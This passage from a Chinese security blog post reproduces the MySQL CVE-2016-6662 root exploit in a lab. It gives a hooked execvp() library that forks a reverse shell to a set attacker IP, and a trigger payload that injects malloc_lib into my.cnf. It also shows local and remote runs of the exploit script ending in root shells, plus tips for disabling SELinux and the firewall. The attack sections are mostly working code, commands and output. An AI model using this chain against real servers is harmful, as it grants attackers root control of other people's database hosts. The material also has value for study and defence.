class="keyword">int</span> <span class="title">execvp</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span>* filename, <span class="keyword">char</span>* <span class="keyword">const</span> argv[])</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// int fd;</span></span><br><span class="line">    <span class="comment">// Simple root PoC (touch /root/root_via_mysql)</span></span><br><span class="line">    <span class="comment">// fd = open("/root/root_via_mysql", O_CREAT);</span></span><br><span class="line">    <span class="comment">// close(fd);</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// clean injected payload before mysqld is started</span></span><br><span class="line">    config_cleanup();</span><br><span class="line">  </span><br><span class="line">    <span class="keyword">pid_t</span>  pid;</span><br><span class="line">    old_execvp = dlsym(RTLD_NEXT, <span class="string">"execvp"</span>);</span><br><span class="line">    <span class="comment">// Fork a reverse shell and execute the original execvp() function</span></span><br><span class="line">    pid = fork();</span><br><span class="line">    <span class="keyword">if</span> (pid == <span class="number">0</span>) </span><br><span class="line">          reverse_shell();</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> old_execvp(filename, argv);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


</li>
</ul>
</li>
</ol>
<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><ul>
<li><p>用<code>mysqld_safe</code>管理<code>mysqld</code>进程；</p>
</li>
<li><p><code>mysqld_safe</code>支持任意路径加载共享库，而且<code>mysqld_safe</code>是<code>root</code>用户启动；</p>
</li>
<li><p><code>mysqld_safe</code>读取配置文件<code>my.cnf</code>，设定启动参数；</p>
</li>
<li><p>利用<code>FILE</code>权限，新建<code>TRIGGERS</code>来设置<code>general_log_file</code>和写入共享库文件<code>mysql_hookandroot_lib.so</code>；</p>
</li>
<li><p>共享库通过hook <code>execvp()</code>，来触发反弹shell；</p>
</li>
</ul>
<h2 id="0x03-攻击复现（本地）"><a href="#0x03-攻击复现（本地）" class="headerlink" title="0x03 攻击复现（本地）"></a>0x03 攻击复现（本地）</h2><p>操作系统：CentOS 7.6</p>
<p>MySQL 版本：5.6.32</p>
<h3 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h3><ul>
<li>安装好MySQL后，查找<code>root</code>默认密码，登录数据库并修改密码；</li>
<li>创建<code>evil</code>数据库；</li>
<li>创建<code>hacker</code>用户，并赋予<code>FILE</code>和<code>evil</code>数据库的<code>SELECT</code>, <code>INSERT</code>, <code>CREATE</code>权限。</li>
</ul>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost ~]# cat /root/.mysql_secret</span><br><span class="line"><span class="meta">#</span><span class="bash"> The random password <span class="built_in">set</span> <span class="keyword">for</span> the root user at Wed Mar  4 08:45:52 2020 (<span class="built_in">local</span> time): nYoQpyVjmlsnR5nw</span></span><br><span class="line">[root@localhost usr]# mysql -u root -p </span><br><span class="line">Enter password: </span><br><span class="line">Welcome to the MySQL monitor.  Commands end with ; or \g.</span><br><span class="line">Your MySQL connection id is 4</span><br><span class="line">Server version: 5.6.32</span><br><span class="line"></span><br><span class="line">Copyright (c) 2000, 2016, Oracle and/or its affiliates. All rights reserved.</span><br><span class="line"></span><br><span class="line">Oracle is a registered trademark of Oracle Corporation and/or its</span><br><span class="line">affiliates. Other names may be trademarks of their respective</span><br><span class="line">owners.</span><br><span class="line"></span><br><span class="line">Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.</span><br><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> SET password=password(<span class="string">'mysql@2020'</span>);</span></span><br><span class="line">Query OK, 0 rows affected (0.02 sec)</span><br><span class="line"></span><br><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> CREATE DATABASE evil;</span></span><br><span class="line">Query OK, 1 row affected (0.03 sec)</span><br><span class="line"></span><br><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> CREATE USER <span class="string">'hacker'</span>@<span class="string">'%'</span> IDENTIFIED BY <span class="string">'hacker@2020'</span>;</span></span><br><span class="line">Query OK, 0 rows affected (0.02 sec)</span><br><span class="line"></span><br><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> GRANT FILE ON *.* TO <span class="string">'hacker'</span>@<span class="string">'%'</span>;</span></span><br><span class="line">Query OK, 0 rows affected (0.00 sec)</span><br><span class="line"></span><br><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> GRANT SELECT, INSERT, CREATE ON `evil`.* TO <span class="string">'hacker'</span>@<span class="string">'%'</span>; </span></span><br><span class="line">Query OK, 0 rows affected (0.00 sec)</span><br></pre></td></tr></table></figure>

<h3 id="攻击"><a href="#攻击" class="headerlink" title="攻击"></a>攻击</h3><ul>
<li><p>修改<code>0ldSQL_MySQL_RCE_exploit.py</code>，将<code>trigger_payload</code>的<code>[mysqld]</code>改为<code>[mysqld_safe]</code>，因为 5.6 版本是这样<a href="https://dev.mysql.com/doc/refman/5.6/en/mysqld-safe.html" target="_blank" rel="noopener">规定</a><code>mysqld_safe</code>的参数。</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">trigger_payload="""TYPE=TRIGGERS</span><br><span class="line">triggers='CREATE DEFINER=`root`@`localhost` TRIGGER appendToConf\\nAFTER INSERT\\n   ON `poctable` FOR EACH ROW\\nBEGIN\\n\\n   DECLARE void varchar(550);\\n   set global general_log_file=\\'%s\\';\\n   set global general_log = on;\\n   select "\\n\\n# 0ldSQL_MySQL_RCE_exploit got here :)\\n\\n[mysqld_safe]\\nmalloc_lib=\\'%s\\'\\n\\n[abyss]\\n" INTO void;   \\n   set global general_log = off;\\n\\nEND'</span><br><span class="line">sql_modes=0</span><br><span class="line">definers='root@localhost'</span><br><span class="line">client_cs_names='utf8'</span><br><span class="line">connection_cl_names='utf8_general_ci'</span><br><span class="line">db_cl_names='latin1_swedish_ci'</span><br><span class="line">""" % (args.TARGET_MYCNF, malloc_lib_path)</span><br></pre></td></tr></table></figure>
</li>
<li><p>修改<code>mysql_hookandroot_lib.c</code>，将<code>config_cleanup</code>放在反弹shell前执行，这样可以保证<code>my.cnf</code>的还原。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// execvp() hook</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">execvp</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span>* filename, <span class="keyword">char</span>* <span class="keyword">const</span> argv[])</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">pid_t</span>  pid;</span><br><span class="line">    <span class="comment">// int fd;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// Simple root PoC (touch /root/root_via_mysql)</span></span><br><span class="line">    <span class="comment">//fd = open("/root/root_via_mysql", O_CREAT);</span></span><br><span class="line">    <span class="comment">//close(fd);</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// clean injected payload before mysqld is started</span></span><br><span class="line">    config_cleanup();</span><br><span class="line">    old_execvp = dlsym(RTLD_NEXT, <span class="string">"execvp"</span>);</span><br><span class="line">    <span class="comment">// Fork a reverse shell and execute the original execvp() function</span></span><br><span class="line">    pid = fork();</span><br><span class="line">    <span class="keyword">if</span> (pid == <span class="number">0</span>) </span><br><span class="line">          reverse_shell();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> old_execvp(filename, argv);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>运行<code>0ldSQL_MySQL_RCE_exploit.py</code></p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost cve-2016-6662]# python 0ldSQL_MySQL_RCE_exploit.py -dbuser hacker -dbpass 'hacker@2020' -dbhost 127.0.0.1 -dbname evil -mycnf /var/lib/mysql/my.cnf</span><br><span class="line"></span><br><span class="line">0ldSQL_MySQL_RCE_exploit.py (ver. 1.0)</span><br><span class="line">(CVE-2016-6662) MySQL Remote Root Code Execution / Privesc PoC Exploit</span><br><span class="line"></span><br><span class="line">For testing purposes only. Do no harm.</span><br><span class="line"></span><br><span class="line">Discovered/Coded by:</span><br><span class="line"></span><br><span class="line">Dawid Golunski</span><br><span class="line">http://legalhackers.com</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[+] Connecting to target server 127.0.0.1 and target mysql account 'hacker@127.0.0.1' using DB 'evil'</span><br><span class="line"></span><br><span class="line">[+] The account in use has the following grants/perms: </span><br><span class="line"></span><br><span class="line">GRANT FILE ON *.* TO 'hacker'@'%' IDENTIFIED BY PASSWORD &lt;secret&gt;</span><br><span class="line">GRANT SELECT, INSERT, CREATE ON `evil`.* TO 'hacker'@'%'</span><br><span class="line"></span><br><span class="line">[+] Compiling mysql_hookandroot_lib.so</span><br><span class="line"></span><br><span class="line">[+] Converting mysql_hookandroot_lib.so into HEX</span><br><span class="line"></span><br><span class="line">[+] Saving trigger payload into /var/lib/mysql/evil/poctable.TRG</span><br><span class="line"></span><br><span class="line">[+] Dumping shared library into /var/lib/mysql/mysql_hookandroot_lib.so file on the target</span><br><span class="line"></span><br><span class="line">[+] Creating table 'poctable' so that injected 'poctable.TRG' trigger gets loaded</span><br><span class="line"></span><br><span class="line">[+] Inserting data to `poctable` in order to execute the trigger and write data to the target mysql config /var/lib/mysql/my.cnf</span><br><span class="line"></span><br><span class="line">[+] Everything is set up and ready. Spawning netcat listener and waiting for MySQL daemon to get restarted to get our rootshell... :)</span><br><span class="line"></span><br><span class="line">Ncat: Version 7.50 ( https://nmap.org/ncat )</span><br><span class="line">Ncat: Listening on :::6033</span><br><span class="line">Ncat: Listening on 0.0.0.0:6033</span><br></pre></td></tr></table></figure>
</li>
<li><p>重启<code>MySQL</code>服务：<code>service mysql restart</code>，接收到反弹shell连接。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Ncat: Connection from 127.0.0.1.</span><br><span class="line">Ncat: Connection from 127.0.0.1:46300.</span><br><span class="line">[root@localhost usr]# id</span><br><span class="line">id</span><br><span class="line">uid&#x3D;0(root) gid&#x3D;0(root) groups&#x3D;0(root) context&#x3D;unconfined_u:system_r:mysqld_safe_t:s0</span><br></pre></td></tr></table></figure>



</li>
</ul>
<h2 id="0x04-攻击复现（远程）"><a href="#0x04-攻击复现（远程）" class="headerlink" title="0x04 攻击复现（远程）"></a>0x04 攻击复现（远程）</h2><p>攻击目标</p>
<ul>
<li><p>操作系统：CentOS 7.6</p>
</li>
<li><p>MySQL版本：5.6.32</p>
</li>
<li><p>IP地址：192.168.187.198</p>
</li>
</ul>
<p>攻击者</p>
<ul>
<li>IP地址：192.168.187.197</li>
</ul>
<h3 id="准备-1"><a href="#准备-1" class="headerlink" title="准备"></a>准备</h3><ul>
<li>开启MySQL远程访问</li>
<li>其他准备同 0x03 攻击复现（本地）</li>
</ul>
<h3 id="攻击-1"><a href="#攻击-1" class="headerlink" title="攻击"></a>攻击</h3><ul>
<li><p>攻击者编译<code>mysql_hookandroot_lib.c</code>（对应攻击目标的系统）；</p>
<p><code>gcc -Wall -fPIC -shared -o mysql_hookandroot_lib.so mysql_hookandroot_lib.c -ldl</code></p>
</li>
<li><p>攻击者修改<code>0ldSQL_MySQL_RCE_exploit.py</code>，注释掉编译so的代码；</p>
</li>
<li><p>攻击者修改<code>mysql_hookandroot_lib.c</code>里反弹shell连接的IP；</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ATTACKERS_IP <span class="meta-string">"192.168.187.197"</span></span></span><br></pre></td></tr></table></figure>
</li>
<li><p>攻击者运行<code>0ldSQL_MySQL_RCE_exploit.py</code>；</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">fen@kaliForFun:~/cve-2016-6662$ python 0ldSQL_MySQL_RCE_exploit.py -dbuser hacker -dbpass 'hacker@2020' -dbhost 192.168.187.198 -dbname evil -mycnf /var/lib/mysql/my.cnf</span><br><span class="line"></span><br><span class="line">0ldSQL_MySQL_RCE_exploit.py (ver. 1.0)</span><br><span class="line">(CVE-2016-6662) MySQL Remote Root Code Execution / Privesc PoC Exploit</span><br><span class="line"></span><br><span class="line">For testing purposes only. Do no harm.</span><br><span class="line"></span><br><span class="line">Discovered/Coded by:</span><br><span class="line"></span><br><span class="line">Dawid Golunski</span><br><span class="line">http://legalhackers.com</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[+] Connecting to target server 192.168.187.198 and target mysql account 'hacker@192.168.187.198' using DB 'evil'</span><br><span class="line"></span><br><span class="line">[+] The account in use has the following grants/perms: </span><br><span class="line"></span><br><span class="line">GRANT FILE ON *.* TO 'hacker'@'%' IDENTIFIED BY PASSWORD &lt;secret&gt;</span><br><span class="line">GRANT SELECT, INSERT, CREATE ON `evil`.* TO 'hacker'@'%'</span><br><span class="line"></span><br><span class="line">[+] Converting mysql_hookandroot_lib.so into HEX</span><br><span class="line"></span><br><span class="line">[+] Saving trigger payload into /var/lib/mysql/evil/poctable.TRG</span><br><span class="line"></span><br><span class="line">[+] Dumping shared library into /var/lib/mysql/mysql_hookandroot_lib.so file on the target</span><br><span class="line"></span><br><span class="line">[+] Creating table 'poctable' so that injected 'poctable.TRG' trigger gets loaded</span><br><span class="line"></span><br><span class="line">[+] Inserting data to `poctable` in order to execute the trigger and write data to the target mysql config /var/lib/mysql/my.cnf</span><br><span class="line"></span><br><span class="line">[+] Everything is set up and ready. Spawning netcat listener and waiting for MySQL daemon to get restarted to get our rootshell... :)</span><br><span class="line"></span><br><span class="line">Ncat: Version 7.80 ( https://nmap.org/ncat )</span><br><span class="line">Ncat: Listening on :::6033</span><br><span class="line">Ncat: Listening on 0.0.0.0:6033</span><br></pre></td></tr></table></figure>
</li>
<li><p>攻击目标重启<code>MySQL</code>服务：<code>service mysql restart</code>，接收到反弹shell连接。</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 攻击目标</span></span><br><span class="line">[root@localhost ~]# service mysql restart</span><br><span class="line">Shutting down MySQL.... SUCCESS! </span><br><span class="line">Starting MySQL....... SUCCESS! </span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 攻击者</span></span><br><span class="line">Ncat: Version 7.80 ( https://nmap.org/ncat )</span><br><span class="line">Ncat: Listening on :::6033</span><br><span class="line">Ncat: Listening on 0.0.0.0:6033</span><br><span class="line">Ncat: Connection from 192.168.187.198.</span><br><span class="line">Ncat: Connection from 192.168.187.198:36660.</span><br><span class="line">[root@localhost usr]# id</span><br><span class="line">id</span><br><span class="line">uid=0(root) gid=0(root) groups=0(root) context=unconfined_u:system_r:mysqld_safe_t:s0</span><br></pre></td></tr></table></figure>



</li>
</ul>
<h2 id="0x05-Q-amp-A"><a href="#0x05-Q-amp-A" class="headerlink" title="0x05 Q&amp;A"></a>0x05 Q&amp;A</h2><ul>
<li><p>为什么装了漏洞版本的 MySQL，但没有mysqld_safe？</p>
<ul>
<li>如果操作系统用systemd管理MySQL，就不会安装<code>mysqld_safe</code>。</li>
</ul>
<blockquote>
<p>For some Linux platforms, MySQL installation from RPM or Debian packages includes systemd support for managing MySQL server startup and shutdown. On these platforms, mysqld_safe is not installed because it is unnecessary. For more information, see Section 2.5.10, “Managing MySQL Server with systemd”. </p>
<p><a href="https://dev.mysql.com/doc/refman/5.7/en/mysqld-safe.html" target="_blank" rel="noopener">https://dev.mysql.com/doc/refman/5.7/en/mysqld-safe.html</a></p>
<p><a href="https://mysqlserverteam.com/mysql-5-7-native-systemd-support/" target="_blank" rel="noopener">https://mysqlserverteam.com/mysql-5-7-native-systemd-support/</a></p>
</blockquote>
</li>
<li><p>ImportError: No module named mysql.connector</p>
<ul>
<li><p>没有安装 python库 ：<a href="https://dev.mysql.com/doc/connector-python/en/" target="_blank" rel="noopener">mysql-connector-python</a></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install mysql-connector-python</span><br></pre></td></tr></table></figure>
</li>
</ul>
</li>
<li><p>存在两个<code>my.cnf</code>，导致远程写入的配置未生效。</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">200304 19:29:24 mysqld_safe WARNING: Found two instances of my.cnf -</span><br><span class="line">/usr/my.cnf and</span><br><span class="line">/var/lib/mysql/my.cnf</span><br><span class="line">IGNORING /var/lib/mysql/my.cnf</span><br></pre></td></tr></table></figure>

<ul>
<li>把<code>/usr/my.cnf</code>移动到<code>/var/lib/mysql/</code></li>
<li>或者将<code>DATADIR</code>设置为<code>/usr/data</code></li>
</ul>
</li>
<li><p>MySQL无法外联</p>
<p>远程连接不上MySQL数据库</p>
<ul>
<li><p>关闭防火墙 <code>systemctl stop firewalld</code></p>
</li>
<li><p>或者开放端口</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">firewall-cmd --zone&#x3D;public --add-port&#x3D;3306&#x2F;tcp --permanent</span><br><span class="line">firewall-cmd --reload</span><br></pre></td></tr></table></figure>
</li>
</ul>
</li>
<li><p>共享库加载失败</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">200305 06:24:23 mysqld_safe Starting mysqld daemon with databases from /var/lib/mysql</span><br><span class="line">ERROR: ld.so: object '/var/lib/mysql/mysql_hookandroot_lib.so' from LD_PRELOAD cannot be preloaded: ignored.</span><br></pre></td></tr></table></figure>

<ul>
<li>关闭<code>SELinux</code>：<code>sudo setenforce 0</code></li>
</ul>
</li>
<li><p>利用LD_PRELOAD进行Hook</p>
<blockquote>
<p>在UNIX的动态链接库的世界中，LD_PRELOAD就是这样一个环境变量，它可以影响程序的运行时的链接（Runtime  linker），它允许你定义在程序运行前优先加载的动态链接库。这个功能主要就是用来有选择性的载入不同动态链接库中的相同函数。通过这个环境变量，我们可以在主程序和其动态链接库的中间加载别的动态链接库，甚至覆盖正常的函数库。</p>
<p><a href="https://www.cnblogs.com/eaglexmw/p/10403148.html" target="_blank" rel="noopener">https://www.cnblogs.com/eaglexmw/p/10403148.html</a></p>
</blockquote>
</li>
</ul>
<p><strong>总结：系统和应用本身用了很多措施来保障安全。即便是有漏洞的情况下，也不见得攻击成功。所以，一些不安全事件的发生，绝不是单纯一个漏洞导致的，是多个环节的疏忽。</strong></p>

      
      <!-- reward -->
      
    </div>
    
    
      <!-- copyright -->
      
        <div class="declare">
          <ul class="post-copyright">
            <li>
              <i class="ri-copyright-line"></i>
              <strong>版权声明： </strong s>
              本博客所有文章除特别声明外，均采用 <a href="https://www.apache.org/licenses/LICENSE-2.0.html" rel="external nofollow"
                target="_blank">Apache License 2.0</a> 许可协议。转载请注明出处！
            </li>
          </ul>
        </div>
        
    <footer class="article-footer">
      
          
<div class="share-btn">
      <span class="share-sns share-outer">
        <i class="ri-share-forward-line"></i>
        分享
      </span>
      <div class="share-wrap">
        <i class="arrow"></i>
        <div class="share-icons">
          

            
          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
            <i class="ri-weibo-fill"></i>
          </a> 
          
          <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
            <i class="ri-wechat-fill"></i>
          </a>
          
          
          
          
          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
            <i class="ri-facebook-circle-fill"></i>
          </a>
          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
            <i class="ri-twitter-fill"></i>
          </a>
          <a class="google share-sns" href="javascript:;" data-type="google">
            <i class="ri-google-fill"></i>
          </a>
        </div>
      </div>
</div>

<div class="wx-share-modal">
    <a class="modal-close" href="javascript:;"><i class="ri-close-circle-line"></i></a>
    <p>扫一扫分享到微信</p>
    <div class="wx-qrcode">
      <img src="//api.qrserver.com/v1/create-qr-code/?size=150x150&data=http://felicitychou.github.io/zh-CN/cve-2016-6662.html" alt="微信分享二维码">
    </div>
</div>

<div id="share-mask"></div>
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/MySQL/" rel="tag">MySQL</a></li></ul>


    </footer>

  </div>

  
  
  <nav class="article-nav">
    
    
      <a href="/zh-CN/cve-2018-1058.html" class="article-nav-link">
        <strong class="article-nav-caption">下一篇</strong>
        <div class="article-nav-title">Postgresql CVE-2018-1058 漏洞分析与利用</div>
      </a>
    
  </nav>


  

  

  
  
  

</article>
</section>
      <footer class="footer">
  <div class="outer">
    <ul class="list-inline">
      <li>
        &copy;
        2020
        Fen
      </li>
      <li>
        
          Powered by
        
        
        <a href="https://hexo.io" target="_blank">Hexo</a> Theme <a href="https://github.com/Shen-Yu/hexo-theme-ayer" target="_blank">Ayer</a>
        
      </li>
    </ul>
    <ul class="list-inline">
      <li>
        
      </li>
      <li>
        <!-- cnzz统计 -->
        
      </li>
    </ul>
  </div>
</footer>
    <div class="to_top">
        <div class="totop" id="totop">
  <i class="ri-arrow-up-line"></i>
</div>
      </div>
    </main>
      <aside class="sidebar">
        <!--
 * @Author: Fen
 * @Date: 2020-02-13 15:12:51
 * @LastEditors  : Fen
 * @LastEditTime : 2020-02-14 14:43:42
 * @Description: 
 -->
<button class="navbar-toggle"></button>
<nav class="navbar">
  
  <div class="logo">
    <a href="/"><img src="/images/hacker-side.svg" alt="FunFen Channel"></a>
  </div>
  
  <ul class="nav nav-main">
    
    <li class="nav-item">
      <a class="nav-item-link" href="/">主页</a>
    </li>
    
    <li class="nav-item">
      <a class="nav-item-link" href="/archives">归档</a>
    </li>
    
    <li class="nav-item">
      <a class="nav-item-link" href="/categories">分类</a>
    </li>
    
    <li class="nav-item">
      <a class="nav-item-link" href="/tags">标签</a>
    </li>
    
    <li class="nav-item">
      <a class="nav-item-link" href="/about">关于</a>
    </li>
    
    

      <li class="nav-item">
        
        <a class="nav-item-link" href="/en">English</a>
        
      </li>

      
  </ul>
</nav>


<nav class="navbar navbar-bottom">
  <ul class="nav">
    <li class="nav-item">
      
      <a class="nav-item-link nav-item-search"  title="搜索">
        <i class="ri-search-line"></i>
      </a>
      
      
    </li>
  </ul>
</nav>
<div class="search-form-wrap">
  <div class="local-search local-search-plugin">
  <input type="search" id="local-search-input" class="local-search-input" placeholder="Search...">
  <div id="local-search-result" class="local-search-result"></div>
</div>
</div>
      </aside>
      <div id="mask"></div>

<!-- #reward -->
<div id="reward">
  <span class="close"><i class="ri-close-line"></i></span>
  <p class="reward-p"><i class="ri-cup-line"></i>请我喝杯咖啡吧~</p>
  <div class="reward-box">
    
    <div class="reward-item">
      <img class="reward-img" src="/images/alipay.jpg">
      <span class="reward-type">支付宝</span>
    </div>
    
    
    <div class="reward-item">
      <img class="reward-img" src="/images/wechat.jpg">
      <span class="reward-type">微信</span>
    </div>
    
  </div>
</div>
      
<script src="/js/jquery-2.0.3.min.js"></script>


<script src="/js/jquery.justifiedGallery.min.js"></script>


<script src="/js/lazyload.min.js"></script>


<script src="/js/busuanzi-2.3.pure.min.js"></script>


<script src="/js/share.js"></script>



<script src="/fancybox/jquery.fancybox.min.js"></script>







<script>
  var ayerConfig = {
    mathjax: false
  }
</script>


<script src="/js/ayer.js"></script>


<script src="https://cdn.jsdelivr.net/npm/jquery-modal@0.9.2/jquery.modal.min.js"></script>
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/jquery-modal@0.9.2/jquery.modal.min.css">


<!-- Root element of PhotoSwipe. Must have class pswp. -->
<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">

    <!-- Background of PhotoSwipe. 
         It's a separate element as animating opacity is faster than rgba(). -->
    <div class="pswp__bg"></div>

    <!-- Slides wrapper with overflow:hidden. -->
    <div class="pswp__scroll-wrap">

        <!-- Container that holds slides. 
            PhotoSwipe keeps only 3 of them in the DOM to save memory.
            Don't modify these 3 pswp__item elements, data is added later on. -->
        <div class="pswp__container">
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
        </div>

        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
        <div class="pswp__ui pswp__ui--hidden">

            <div class="pswp__top-bar">

                <!--  Controls are self-explanatory. Order can be changed. -->

                <div class="pswp__counter"></div>

                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>

                <button class="pswp__button pswp__button--share" style="display:none" title="Share"></button>

                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>

                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>

                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
                <!-- element will get class pswp__preloader--active when preloader is running -->
                <div class="pswp__preloader">
                    <div class="pswp__preloader__icn">
                        <div class="pswp__preloader__cut">
                            <div class="pswp__preloader__donut"></div>
                        </div>
                    </div>
                </div>
            </div>

            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
                <div class="pswp__share-tooltip"></div>
            </div>

            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
            </button>

            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
            </button>

            <div class="pswp__caption">
                <div class="pswp__caption__center"></div>
            </div>

        </div>

    </div>

</div>

<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css">
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.css">
<script src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"></script>
<script src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"></script>

<script>
    function viewer_init() {
        let pswpElement = document.querySelectorAll('.pswp')[0];
        let $imgArr = document.querySelectorAll(('.article-entry img:not(.reward-img)'))

        $imgArr.forEach(($em, i) => {
            $em.onclick = () => {
                // slider展开状态
                // todo: 这样不好，后面改成状态
                if (document.querySelector('.left-col.show')) return
                let items = []
                $imgArr.forEach(($em2, i2) => {
                    let img = $em2.getAttribute('data-idx', i2)
                    let src = $em2.getAttribute('data-target') || $em2.getAttribute('src')
                    let title = $em2.getAttribute('alt')
                    // 获得原图尺寸
                    const image = new Image()
                    image.src = src
                    items.push({
